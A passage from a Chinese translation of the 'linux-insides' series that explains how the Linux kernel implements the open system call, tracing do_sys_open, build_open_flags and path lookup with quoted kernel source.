class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(open, <span class="keyword">const</span> <span class="keyword">char</span> __user *, filename, <span class="keyword">int</span>, flags, <span class="keyword">umode_t</span>, mode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (force_o_largefile())</span><br><span class="line">flags |= O_LARGEFILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_sys_open(AT_FDCWD, filename, flags, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你阅读过<a href="https://xinqiu.gitbooks.io/linux-insides-cn/content/SysCall/linux-syscall-4.html" target="_blank" rel="external">上一节</a>，你应该知道系统调用通过 <code>SYSCALL_DEFINE</code> 宏定义实现。因此，<code>open</code> 系统调用也不例外。</p><p><code>open</code> 系统调用位于 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">fs/open.c</a> 源文件中，粗看非常简短</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(open, <span class="keyword">const</span> <span class="keyword">char</span> __user *, filename, <span class="keyword">int</span>, flags, <span class="keyword">umode_t</span>, mode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (force_o_largefile())</span><br><span class="line">flags |= O_LARGEFILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_sys_open(AT_FDCWD, filename, flags, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你或许已经猜到了，同一个<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">源文件</a>中的 <code>do_sys_open</code> 函数才是主要的。但是在进入这个函数被调用前，我们来看看 <code>open</code> 系统调用定义的实现代码中 <code>if</code> 分支语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (force_o_largefile())</span><br><span class="line">flags |= O_LARGEFILE;</span><br></pre></td></tr></table></figure><p>这里可以看到如果 <code>force_o_largefile()</code> 返回 true，传递给 <code>open</code> 系统调用的 flags 参数会加上了 <code>O_LARGEFILE</code> 标志。<code>O_LARGEFILE</code> 是什么？阅读 <code>open(2)</code> <a href="http://man7.org/linux/man-pages/man2/open.2.html" target="_blank" rel="external">man 手册</a> 可以了解到：</p><blockquote><p>O_LARGEFILE</p><p>(LFS) Allow files whose sizes cannot be represented in an off_t (but can be represented in an off64_t) to be opened.</p></blockquote><p>在 <a href="https://www.gnu.org/software/libc/manual/html_mono/libc.html#File-Position-Primitive" target="_blank" rel="external">GNU C 标准库参考手册</a>中可以获取更多信息：</p><blockquote><p>off_t</p><p>   This is a signed integer type used to represent file sizes.<br>   In the GNU C Library, this type is no narrower than int.<br>   If the source is compiled with _FILE_OFFSET_BITS == 64 this<br>   type is transparently replaced by off64_t.</p></blockquote><p>和</p><blockquote><p>off64_t</p><p>   This type is used similar to off_t. The difference is that<br>   even on 32 bit machines, where the off_t type would have 32 bits,<br>   off64_t has 64 bits and so is able to address files up to 2^63 bytes<br>   in length. When compiling with _FILE_OFFSET_BITS == 64 this type<br>   is available under the name off_t.</p></blockquote><p>因此不难猜到 <code>off_t</code>,<code>off64_t</code> 和 <code>O_LARGEFILE</code> 是关于文件大小的。就 Linux 内核而言，在32 位系统中打开大文件时如果调用者没有加上 <code>O_LARGEFILE</code> 标志，打开大文件会操作会被禁止。在 64 位系统上，我们在 <code>open</code> 系统调用时强制加上了这个标志。<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/include/linux/fcntl.h#L7" target="_blank" rel="external">include/linux/fcntl.h</a> linux 内核头文件中详述了 <code>force_o_largefile</code> 宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> force_o_largefile</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> force_o_largefile() (BITS_PER_LONG != 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这个宏因 CPU 架构有所不同，但在我们当前的情况即 <a href="https://en.wikipedia.org/wiki/X86-64" target="_blank" rel="external">x86_64</a> 下，没有提供 <code>force_o_largefile</code> 宏的定义，但这个宏在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/include/linux/fcntl.h#L7" target="_blank" rel="external">include/linux/fcntl.h</a>出现了。</p><p>因此，正如我们当前了解的， <code>force_o_largefile</code> 在我们当前的 <a href="https://en.wikipedia.org/wiki/X86-64" target="_blank" rel="external">x86_64</a> 架构下就是一个展开为 “true” 值的宏。因此我们正考虑的是 64 位的情况，因此 <code>force_o_largefile</code> 将展开为 true 并且 <code>O_LARGEFILE</code> 标志将被添加到 <code>open</code> 系统调用的 flags 参数中。</p><p>现在我们了解 <code>O_LARGEFILE</code> 标志和 <code>force_o_largefile</code> 宏的意义，我们可以继续讨论 <code>do_sys_open</code> 函数的实现。正如我之前所写的，这个函数被定义在<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">同一个源文件</a>中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">do_sys_open</span><span class="params">(<span class="keyword">int</span> dfd, <span class="keyword">const</span> <span class="keyword">char</span> __user *filename, <span class="keyword">int</span> flags, <span class="keyword">umode_t</span> mode)</span></span><br><span class="line"></span>&#123;</span><br><span class="line"><span class="keyword">struct</span> open_flags op;</span><br><span class="line"><span class="keyword">int</span> fd = build_open_flags(flags, mode, &amp;op);</span><br><span class="line"><span class="keyword">struct</span> filename *tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd)</span><br><span class="line"><span class="keyword">return</span> fd;</span><br><span class="line"></span><br><span class="line">tmp = getname(filename);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tmp))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tmp);</span><br><span class="line"></span><br><span class="line">fd = get_unused_fd_flags(flags);</span><br><span class="line"><span class="keyword">if</span> (fd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">struct</span> file *f = do_filp_open(dfd, tmp, &amp;op);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(f)) &#123;</span><br><span class="line">put_unused_fd(fd);</span><br><span class="line">fd = PTR_ERR(f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fsnotify_open(f);</span><br><span class="line">fd_install(fd, f);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">putname(tmp);</span><br><span class="line"><span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们试着一步一步理解 <code>do_sys_open</code> 如何工作。</p><h2><span id="open2-flags-参数">open(2) flags 参数</span></h2><p>现在你已经知道 <code>open</code> 系统调用通过设置第二个参数 flags 来控制打开一个文件并且第三个参数 <code>mode</code> 规定创建文件的权限。<code>do_sys_open</code> 函数开头调用了 <code>build_open_flags</code> 函数，这个函数检查给定的 flags 参数是否有效，并处理不同的 flags 和 mode 条件。</p><p>让我们看看 <code>build_open_flags</code> 的实现，这个函数被定义在<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">同一个内核文件</a>并且需要三个参数：</p><ul><li>flags - 控制打开一个文件</li><li>mode - 新建文件的权限</li></ul><p>最后的参数 - <code>op</code> 在 <code>open_flags</code> 结构体中表示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> open_flags &#123;</span><br><span class="line">        <span class="keyword">int</span> open_flag;</span><br><span class="line">        <span class="keyword">umode_t</span> mode;</span><br><span class="line">        <span class="keyword">int</span> acc_mode;</span><br><span class="line">        <span class="keyword">int</span> intent;</span><br><span class="line">        <span class="keyword">int</span> lookup_flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/internal.h#L99" target="_blank" rel="external">fs/internal.h</a> 头文件中并且我们可以看到这个结构体保存了给内核的 flags 和 权限模式信息，你或许已经猜到了 <code>build_open_flags</code> 函数的主要目的就是生成一个 <code>open_flags</code> 结构体实例。</p><p><code>build_open_flags</code> 函数的实现里定义了一系列局部变量，其中一个是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> acc_mode = ACC_MODE(flags);</span><br></pre></td></tr></table></figure><p>这个局部变量表示权限模式，它的初始值会等于 <code>ACC_MODE</code> 宏展开的值，这个宏定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/include/linux/fs.h" target="_blank" rel="external">include/linux/fs.h</a>,看起来非常有趣：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ACC_MODE(x) (<span class="string">"\004\002\006\006"</span>[(x)&amp;O_ACCMODE])</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_ACCMODE   00000003</span></span><br></pre></td></tr></table></figure><p><code>&quot;\004\002\006\006&quot;</code> 是一个四字符的数组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\004\002\006\006&quot; == &#123;&apos;\004&apos;, &apos;\002&apos;, &apos;\006&apos;, &apos;\006&apos;&#125;</span><br></pre></td></tr></table></figure></p><p>因此，<code>ACC_MODE</code> 宏就是通过 <code>[(x) &amp; O_ACCMODE]</code> 索引展开这个数组里的值。我们可以看到，<code>O_ACCMODE</code> == 00000003.通进行 <code>x &amp; O_ACCMODE</code>，我们拿最后两个重要的位来表示 <code>read</code>,<code>write</code> 或 <code>read/weite</code> 权限：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDONLY        00000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_WRONLY        00000001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDWR          00000002</span></span><br></pre></td></tr></table></figure><p>再从数组中计算索引得到值后，<code>ACC_MODE</code> 会展开一个文件的权限标志，包含 <code>MAY_WRITE</code>,<code>MAY_READ</code> 和其他信息。</p><p>在我们计算得到初始权限模式后，我们会看到以下条件判断语句：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; (O_CREAT | __O_TMPFILE))</span><br><span class="line">op-&gt;mode = (mode &amp; S_IALLUGO) | S_IFREG;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">op-&gt;mode = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>如果一个被打开的文件不是临时文件并且不是以新建文件方式打开的，我们可以在 <code>open_flags</code> 实例中重置模式。这是因为：</p><blockquote><p>if  neither O_CREAT nor O_TMPFILE is specified, then mode is ignored.</p></blockquote><p>在其他情况下，如果 <code>O_CREAT</code> 和 <code>O_TMPFILE</code> 标志被传递，我们可以把这个转换为一个规则文件因为 <code>opendir</code>(<a href="http://man7.org/linux/man-pages/man3/opendir.3.html" target="_blank" rel="external">http://man7.org/linux/man-pages/man3/opendir.3.html</a>) 系统调用会创建一个目录。</p><p>在接下来的步骤，我们检查一个文件是否被 <a href="http://man7.org/linux/man-pages/man7/fanotify.7.html" target="_blank" rel="external">fanotify</a>打开过并且没有 <code>O_CLOSEXEC</code> 标志：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flags &amp;= ~FMODE_NONOTIFY &amp; ~O_CLOEXEC;</span><br></pre></td></tr></table></figure><p>确定没有泄露 <a href="https://en.wikipedia.org/wiki/File_descriptor" target="_blank" rel="external">文件描述符</a>。默认地，通过一个 <code>execve</code> 系统调用，新的文件描述符会被设置为保持打开（状态），但 <code>open</code> 系统调用支持 <code>O_CLOSEXEC</code> 标志，这样可以被用来改变默认的操作行为。我们做这些是用来保护文件描述符，这样即使在一个线程中打开一个文件并设置 <code>O_CLOSEXEC</code> 标志并且同时第二个程序 <a href="https://en.wikipedia.org/wiki/Fork_\(system_call\" target="_blank" rel="external">fork</a>) + <a href="https://en.wikipedia.org/wiki/Exec_\(system_call\" target="_blank" rel="external">execve</a>) 操作时不会泄露文件描述符。你应该还记得子程序会有一份父程序文件描述符的副本。</p><p>接下来检查 flags 参数是否包含 <code>O_SYNC</code> 标志，（如果包含）则外加 <code>O_DSYNC</code> 标志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (flags &amp; __O_SYNC)</span><br><span class="line">flags |= O_DSYNC;</span><br></pre></td></tr></table></figure><p><code>O_SYNC</code> 标志确保在所有的数据写入到磁盘前，任何关于写的调用不会返回。<code>O_DSYNC</code> 和 <code>O_SYNC</code> 类似，但 (<code>O_DSYNC</code>) 没有要求所有将被写入的元数据（像 <code>atime</code>,<code>mtime</code> 等等）等待。所以在 Linux 内核里把 <code>O_DSYNC</code> + <code>__O_SYNC</code>,实现为 <code>__O_SYNC|O_DSYNC</code>。</p><p>接下来，必须确认用户是否想要创建一个临时文件，flags 参数应该会包含 <code>O_TMPFILE_MASK</code> 或者说，会包含 <code>O_CREAT</code> | <code>O_TMPFILE</code> 或者 <code>O_CREAT</code> &amp; <code>O_TMPFILE</code> 的运算结果，并且确保（文件）可写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; __O_TMPFILE) &#123;</span><br><span class="line"><span class="keyword">if</span> ((flags &amp; O_TMPFILE_MASK) != O_TMPFILE)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (!(acc_mode &amp; MAY_WRITE))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; O_PATH) &#123;</span><br><span class="line">       flags &amp;= O_DIRECTORY | O_NOFOLLOW | O_PATH;</span><br><span class="line">        acc_mode = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在 man 手册中有提及：</p><blockquote><p>O_TMPFILE  must  be  specified  with one of O_RDWR or O_WRONLY</p></blockquote><p>如果没有传递 <code>O_TMPFILE</code> 标志去创建一个临时文件，在接下来的判断中检查 <code>O_PATH</code> 标志。<code>O_PATH</code> 标志允许我们在下列情形获得文件描述符：</p><ul><li>在文件系统(目录)树中指示一个位置</li><li>仅仅只在文件描述符层面执行操作</li></ul><p>因此，在这种情况下文件自身是没有被打开的，但是像 <code>dup</code>,<code>fcntl</code> 等其他操作能使用。因此，如果所有的文件相关的操作，像     <code>read</code>,<code>write</code> 和其他操作是允许的，仅 <code>O_DIRECTORY | O_NOFOLLOW | O_PATH</code> 标志能被使用。现在我们已经在 <code>build_open_flags</code> 函数中分析完成了这些标志，我们可以使用下列代码填充我们的 <code>open_flags-&gt;open_flag</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op-&gt;open_flag = flags;</span><br></pre></td></tr></table></figure><p>现在我们已经填完了 <code>open_flag</code> 中表示对打开文件操作各种控制的 flags 字段和表示新建一个文件的 <code>umask</code> 的 <code>mode</code> 字段。接下来填充 <code>open_flags</code> 结构体中后面的字段。<code>op-&gt;acc_mode</code> 表示打开文件的权限，我们在 <code>build_open_flags</code> 里已经用初始值填完了 <code>acc_mode</code> 中的局部变量，接下来检查后面两个与权限相关的 flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; O_TRUNC)</span><br><span class="line">        acc_mode |= MAY_WRITE;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; O_APPEND)</span><br><span class="line">acc_mode |= MAY_APPEND;</span><br><span class="line">op-&gt;acc_mode = acc_mode;</span><br></pre></td></tr></table></figure><p><code>O_TRUNC</code> 标志表示如果已打开的文件之前已经存在则删节为 0 ，<code>O_APPEND</code> 标志允许以 append mode (追加模式) 打开一个文件。因此在写已打开的文件会追加，而不是覆写。</p><p><code>open_flags</code> 中接下来的字段是 - <code>intent</code>。它允许我们知道我们的目的，换句话说就是我们真正想对文件做什么，打开，新建，重命名等等操作。如果我们的 flags 参数包含这个 <code>O_PATH</code> 标志，<code>open_flags</code> 会被设置为 0 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op-&gt;intent = flags &amp; O_PATH ? <span class="number">0</span> : LOOKUP_OPEN;</span><br></pre></td></tr></table></figure><p>或仅仅为了 <code>LOOK_OPEN</code> 目的。如果我们想要新建文件，我们可以设置 <code>LOOKUP_CREATE</code>，并且使用 <code>O_EXEC</code> 标志来确认文件之前不存在：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; O_CREAT) &#123;</span><br><span class="line">op-&gt;intent |= LOOKUP_CREATE;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; O_EXCL)</span><br><span class="line">op-&gt;intent |= LOOKUP_EXCL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>open_flags</code> 结构体里最后的标志是 <code>lookup_flags</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; O_DIRECTORY)</span><br><span class="line">lookup_flags |= LOOKUP_DIRECTORY;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; O_NOFOLLOW))</span><br><span class="line">lookup_flags |= LOOKUP_FOLLOW;</span><br><span class="line">op-&gt;lookup_flags = lookup_flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>如果我们想要打开一个目录并且遍历但不想使用<a href="https://en.wikipedia.org/wiki/Symbolic_link" target="_blank" rel="external">软链接</a>，我们可以使用 <code>LOOKUP_DIRECTORY</code> 。这就是 <code>build_open_flags</code> 函数的全部内容了。<code>open_flags</code> 结构体也用各种打开文件的 modes 和 flags 填完了。我们可以返回到 <code>do_sys_open</code>。</p><h2><span id="打开文件的实际操作">打开文件的实际操作</span></h2><p>在 <code>build_open_flags</code> 函数完成后，我们为我们的文件建立了 flags 和 modes ，接下来我们在 <code>getname</code> 函数的帮助下得到 <code>filename</code> 结构体，得到传递给 <code>open</code> 系统调用的文件名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tmp = getname(filename);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tmp))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tmp);</span><br></pre></td></tr></table></figure><p>getname 函数在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/namei.c" target="_blank" rel="external">fs/namei.c</a> 源码文件中定义，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">struct</span> filename *</span><br><span class="line"><span class="title">getname</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user * filename)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getname_flags(filename, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数仅仅调用 <code>getname_flags</code> 函数然后返回它的结果。<code>getname_flags</code> 函数的主要目的是从用户空间复制文件路径到内核空间。<code>filename</code> 结构体被定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/include/linux/fs.h" target="_blank" rel="external">include/linux/fs.h</a> 头文件中，包含以下字段：</p><ul><li>name - 指向内核空间的文件路径指针</li><li>uptr - 用户空间的原始指针</li><li>aname - 来自 audit 上下文的文件名</li><li>refcnt - 引用计数</li><li>iname - 文件名，长度小于 <code>PATH_MAX</code></li></ul><p>如上所述，<code>getname_flags</code> 函数使用 <code>strncpy_from_user</code> 函数复制传递给 <code>open</code> 系统调用的用户空间的文件名到内核空间。接下来就是获取新的空闲文件描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = get_unused_fd_flags(flags);</span><br></pre></td></tr></table></figure><p><code>get_unused_fd_flags</code> 函数获取当前程序打开文件的（文件描述符）表，系统中文件描述符 minimum (<code>0</code>) 和 maximum (<code>RLIMIT_NOFILE</code>) 可能的值和我们已传递到 <code>open</code> 系统调用的标志，并分配文件描述符，将其在当前进程的文件描述符表中的标记为忙碌状态。<code>get_unused_fd_flags</code> 函数设置或清除 <code>O_CLOEXEC</code> 标志取决于传递过来 flags 参数状态。</p><p><code>do_sys_open</code> 最后主要的步骤就是 <code>do_filp_open function</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> file *f = do_filp_open(dfd, tmp, &amp;op);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(f)) &#123;</span><br><span class="line">put_unused_fd(fd);</span><br><span class="line">fd = PTR_ERR(f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fsnotify_open(f);</span><br><span class="line">fd_install(fd, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>do_filp_open()</code> 函数主要解析给定的文件路径名到 <code>file</code> 结构体，<code>file</code> 结构体描述一个程序里已打开的文件。如果传过来的参数有误，则 <code>do_filp_open</code> 执行失败，并使用 <code>put_unused_fd</code> 释放文件描述符。如果 <code>do_filp_open()</code> 执行成功并返回 <code>file</code> 结构体，将会在当前程序的文件描述符表中存储这个 <code>file</code> 结构体。</p><p>现在让我们来简短看下 <code>do_filp_open()</code> 函数的实现。这个函数定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/namei.c" target="_blank" rel="external">fs/namei.c</a> Linux 内核源码中，函数开始就初始化了 <code>nameidata</code> 结构体。这个结构体提供了一个链接到文件 <a href="https://en.wikipedia.org/wiki/Inode" target="_blank" rel="external">inode</a>。事实上，这就是 <code>do_filp_open()</code> 函数指针，这个函数获取一个传递给 open 系统调用的文件名 <code>inode</code> ，在 <code>nameidata</code> 结构体被初始化后，<code>path_openat</code> 函数会被调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">filp = path_openat(&amp;nd, op, flags | LOOKUP_RCU);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(filp == ERR_PTR(-ECHILD)))</span><br><span class="line">filp = path_openat(&amp;nd, op, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(filp == ERR_PTR(-ESTALE)))</span><br><span class="line">filp = path_openat(&amp;nd, op, flags | LOOKUP_REVAL);</span><br></pre></td></tr></table></figure><p>注意 <code>path_openat</code> 会被调用了三次。事实上，Linux 内核会以 <a href="https://www.kernel.org/doc/Documentation/RCU/whatisRCU.txt" target="_blank" rel="external">RCU</a> 模式打开文件。这是最有效的打开文件的方式。如果打开失败，内核进入正常模式。第三次调用相对较少（出现），仅在 <a href="https://en.wikipedia.org/wiki/Network_File_System" target="_blank" rel="external">nfs</a>  文件系统中使用。<code>path_openat</code> 函数执行 <code>path lookup</code>，换句话说就是尝试寻找一个与路径相符合的 <code>dentry</code> (目录数据结构，Linux 内核用来追踪记录文件在目录里层次结构)。</p><p><code>path_openat</code> 函数从调用 <code>get_empty_flip()</code> 函数开始。<code>get_empty_flip()</code> 分配一个新 <code>file</code> 结构体并做一些额外的检查，像我们是否打开超出了系统中能打开的文件的数量等。在我们获得了已分配的新 <code>file</code> 结构体后，如果我们给 <code>open</code> 系统调用传递了 <code>O_TMPFILE</code> | <code>O_CREATE</code> 或 <code>O_PATH</code> 标志，则调用 <code>do_tmpfile</code> 或 <code>do_o_path</code> 函数。在我们想要打开已存在的文件和想要读写时这些情况是非常特殊的，因此我们仅考虑常见的情形。</p><p>正常情况下，会调用 <code>path_init</code> 函数。这个函数在进行真正的路径寻找前执行一些预备工作。包括寻找路径遍历中的开始的位置和元数据像路径中的 <code>inode</code> ，<code>dentry inode</code> 等。我们可能会遇到根目录的和当前目录的情形，因为我们使用 <code>AT_CWD</code> 作为开始指针（查阅本文前面调用 <code>do_sys_open</code> 部分）。</p><p><code>path_init</code> 之后是 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/namei.c#L3457" target="_blank" rel="external">loop</a>。loop 执行 <code>link_path_walk</code> 和 <code>do_last</code> 。<code>link_path_walk</code> 执行（文件）名解析，也就是说就是开始处理一个给定的路径。这个程序一步一步处理除了最后一个组成部分的文件路径。这个处理包括检查权限和获得文件组成。一旦一个文件的组成部分被获得，它会被传递给 <code>walk_component</code> ，这个函数从 <code>dcache</code> 更新当前的目录入口或询问底层文件系统。这样的处理过程一直重复到所有的路径组成部分。<code>link_path_walk</code> 执行后，<code>do_last</code> 函数会基于 <code>link_path_walk</code> 返回的结果填入一个 <code>file</code> 文件结构体。当我们处理完给定的文件路径中的最后一个组成部分，<code>do_last</code> 中的 <code>vfs_open</code> 函数将会被调用。</p><p><code>vfs_open</code> 这个函数定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">fs/open.c</a> Linux 内核源文件中，主要的目的是调用一个底层文件系统的打开操作。</p><p>自此我们的讨论结束了，我们不考虑<strong>完整</strong>的 <code>open</code> 系统调用的实现。我们跳过了一些内容，像从挂载的文件系统打开文件的处理条件，解析软链接等，但去查阅这些处理特征应该不会很难。这些要素不包括在<strong>通用的</strong> <code>open</code> 系统调用实现中，具体特征取决于底层文件系统。如果你对此感兴趣，可查阅 <code>file_operations.open</code> 回调函数获得关于 <a href="https://github.com/torvalds/linux/tree/master/fs" target="_blank" rel="external">filesystem</a> 更确切的描述。</p><h2><span id="总结">总结</span></h2><p>Linux 内核中关于不同系统调用的实现的第五部分已经完成了。如果你有任何问题, 可通过 twitter 或邮箱与我联系，<a href="https://twitter.com/0xAX" target="_blank" rel="external">@0xAX</a>/<a href="anotherworldofworld@gmail.com">email</a>, 或者提交一个 <a href="https://github.com/0xAX/linux-internals/issues/new" target="_blank" rel="external">issue</a>. 在接下来的部分, 我们将继续深究 Linux 内核中的系统调用并且看看 <a href="http://man7.org/linux/man-pages/man2/read.2.html" target="_blank" rel="external">read</a> 